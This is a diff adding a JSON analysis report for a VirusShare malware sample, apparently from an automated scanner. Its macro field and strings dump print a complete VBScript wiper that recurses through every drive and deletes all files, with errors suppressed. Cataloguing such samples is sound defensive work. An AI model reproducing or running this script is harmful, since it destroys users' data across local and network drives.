@@ -1,0 +1,51 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "'\nOn Error Resume Next\n Set F50 = CreateObject(\"Scripting.FileSystemObject\")\n For Each F00 In F50.Drives\n  If F00.DriveType >= 2 Then\n\t   Toy(F00.Path&\"\\\")\n  End If\n Next\n'\nSub Toy(fspec)\n On Error Resume Next\n Set F54 = F50.GetFolder(fspec)\n For Each F52 In F54.Files\n\tF50.GetFile(F52.Path).Attributes = (16 + 16)\n\tF50.DeleteFile F52.Path\n Next\n For Each F52 In F54.SubFolders\n\tToy(F52.Path)\n Next\nEnd Sub\n'"
+    },
+    "filename": "VirusShare_4471304b7f8ddb0cdc05d8c018435dbf",
+    "filesize": 430,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "4471304b7f8ddb0cdc05d8c018435dbf",
+        "sha1": "dfa719241544b66883f35ae6e692e2d4af50181c",
+        "sha256": "073c3ccb5d3c4e7232f82d7a13ee50e7f470f5d526241d919ec4f37e8d224641"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            " Set F50 = CreateObject(\"Scripting.FileSystemObject\")",
+            " For Each F00 In F50.Drives",
+            "  If F00.DriveType >= 2 Then",
+            "\t   Toy(F00.Path&\"\\\")",
+            "  End If",
+            " Next",
+            "Sub Toy(fspec)",
+            " On Error Resume Next",
+            " Set F54 = F50.GetFolder(fspec)",
+            " For Each F52 In F54.Files",
+            "\tF50.GetFile(F52.Path).Attributes = (16 + 16)",
+            "\tF50.DeleteFile F52.Path",
+            " Next",
+            " For Each F52 In F54.SubFolders",
+            "\tToy(F52.Path)",
+            " Next",
+            "End Sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.266454",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
